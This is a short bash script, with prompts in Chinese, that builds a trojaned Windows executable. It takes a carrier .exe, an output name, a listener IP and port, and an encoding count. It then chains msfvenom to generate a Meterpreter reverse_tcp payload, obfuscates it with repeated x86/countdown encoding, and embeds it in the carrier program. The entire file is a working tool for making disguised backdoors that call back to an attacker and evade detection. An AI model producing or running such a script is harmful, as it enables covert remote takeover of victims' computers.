#!/bin/bash

echo "选择目标平台架构: "
echo "1) x86"
echo "2) x64"
while true; do
  read -p ": " option
  case $option in
    1 ) platform="x86"; break;;
    2 ) platform="x64"; break;;
    * ) echo "无效输入，请重新选择。";;
  esac
done

echo "载体名，无需输入后缀，本程序将自动补齐"
read -p "载体名: " template
template_base=${template%%.*}  # Remove extension if exists
template=${template_base}".exe"  # Add .exe extension

echo "成品名，无需输入后缀，本程序将自动补齐"
read -p "成品名: " output
output_base=${output%%.*}  # Remove extension if exists
output=${output_base}".exe"  # Add .exe extension

if [ "$template" != "$template_base" ] || [ "$output" != "$output_base" ]; then
  echo "以上名若有误,本程序将自动纠正"
fi

read -p "监听端IP  (LHOST): " lhost
read -p "监听者端口 (LPORT): " lport
read -p "countdown编码次数:" countdown

# Run msfvenom command with user inputs
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw | \
msfvenom -a x86 --platform windows -e x86/countdown -i $countdown -f raw - | \
msfvenom -a x86 --platform windows -x $template -f exe -o $output

echo "LHOST为:   $lhost"
echo "LPORT值为: $lport"
